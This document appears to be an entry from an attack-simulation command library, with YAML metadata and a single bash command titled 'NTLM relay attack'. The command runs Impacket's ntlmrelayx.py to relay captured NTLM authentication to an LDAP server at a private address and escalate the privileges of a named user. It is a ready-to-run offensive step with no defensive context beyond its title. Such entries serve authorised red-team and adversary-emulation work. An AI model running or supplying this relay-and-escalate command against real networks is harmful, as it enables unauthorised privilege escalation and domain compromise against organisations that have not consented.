---
id: 8e80adb9-59cc-45df-ac6e-eec5c7c1c11d
name: NTLM relay attack
type: command
executor: bash
data: sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user
  winrm_user_1
output: null
created_at: '2023-04-06T03:56:05.609225+00:00'
updated_at: '2023-04-10T20:26:29.616322+00:00'
---

# NTLM relay attack

```bash
sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
```


